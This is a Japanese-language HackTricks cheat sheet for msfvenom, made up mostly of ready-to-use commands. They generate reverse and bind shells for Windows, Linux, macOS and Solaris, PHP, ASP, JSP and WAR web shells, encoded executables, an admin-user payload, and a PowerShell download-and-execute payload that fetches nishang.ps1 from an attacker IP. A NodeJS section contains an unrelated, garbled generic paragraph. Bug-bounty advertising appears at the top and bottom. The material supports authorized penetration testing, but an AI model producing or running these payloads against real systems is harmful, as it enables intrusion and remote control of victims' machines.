# MSFVenom - チートシート

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

***

## 基本的なmsfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

`-a`を使用してアーキテクチャを指定することもできます。または、`--platform`を使用します。

## リスト表示
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## シェルコードを作成する際の一般的なパラメータ

When creating a shellcode, there are several common parameters that can be used to customize the payload. These parameters include:

- **LHOST**: The local IP address or hostname that the reverse shell will connect back to.
- **LPORT**: The local port number that the reverse shell will use for the connection.
- **RHOST**: The remote IP address or hostname that the bind shell will listen on.
- **RPORT**: The remote port number that the bind shell will listen on.
- **EXITFUNC**: The method used to exit the shellcode after execution.
- **Encoder**: The encoding method used to obfuscate the shellcode.
- **BadChars**: Any characters that should be avoided in the shellcode.
- **Payload**: The specific payload to be used, such as windows/meterpreter/reverse_tcp.

シェルコードを作成する際には、ペイロードをカスタマイズするために使用できるいくつかの一般的なパラメータがあります。これらのパラメータには以下が含まれます：

- **LHOST**：リバースシェルが接続するローカルIPアドレスまたはホスト名。
- **LPORT**：リバースシェルが接続に使用するローカルポート番号。
- **RHOST**：バインドシェルがリッスンするリモートIPアドレスまたはホスト名。
- **RPORT**：バインドシェルがリッスンするリモートポート番号。
- **EXITFUNC**：シェルコードの実行後に使用される終了方法。
- **エンコーダ**：シェルコードを曖昧化するために使用されるエンコーディング方法。
- **BadChars**：シェルコードで回避する必要のある任意の文字。
- **ペイロード**：使用する特定のペイロード（例：windows/meterpreter/reverse_tcp）。
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **リバースシェル**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### バインドシェル

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### ユーザーの作成

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
{% endcode %}

### CMDシェル

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **コマンドの実行**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
{% endcode %}

### エンコーダ

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 実行可能ファイルに埋め込まれた

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linuxのペイロード

### リバースシェル

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### バインドシェル

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% code overflow="wrap" %}

### SunOS（Solaris）

{% endcode %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
{% endcode %}

## **MAC ペイロード**

### **リバースシェル:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
{% endcode %}

### **バインドシェル**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **Webベースのペイロード**

### **PHP**

#### 逆シェル

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### リバースシェル

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### リバースシェル

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### リバースシェル

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS

NodeJSは、サーバーサイドでJavaScriptを実行するためのプラットフォームです。NodeJSを使用すると、JavaScriptを使用してWebサーバーやネットワークアプリケーションを構築することができます。NodeJSは、非同期イベント駆動型のプログラミングモデルを採用しており、高いパフォーマンスとスケーラビリティを提供します。

NodeJSを使用してペネトレーションテストを実行する場合、以下の手順に従ってください。

1. NodeJSのインストール: NodeJSをインストールするために、公式のNodeJSウェブサイトから最新のバージョンをダウンロードしてインストールします。

2. 必要なモジュールのインストール: ペネトレーションテストに必要なモジュールをインストールします。例えば、`express`モジュールを使用してWebサーバーを作成する場合は、`npm install express`コマンドを使用します。

3. ペネトレーションテストの実行: NodeJSを使用してペネトレーションテストを実行します。例えば、`express`モジュールを使用して作成したWebサーバーに対して、セキュリティの脆弱性をテストするために、ツールや手法を使用することができます。

NodeJSは、柔軟性と拡張性があり、ペネトレーションテストにおいても有用なツールとして利用されています。NodeJSを使用することで、効率的かつ効果的なペネトレーションテストを実行することができます。

{% endcode %}
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **スクリプト言語のペイロード**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% endcode %}

### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
{% code overflow="wrap" %}

### **Bash（バッシュ）**

{% endcode %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報酬の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報酬は、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期におけるweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
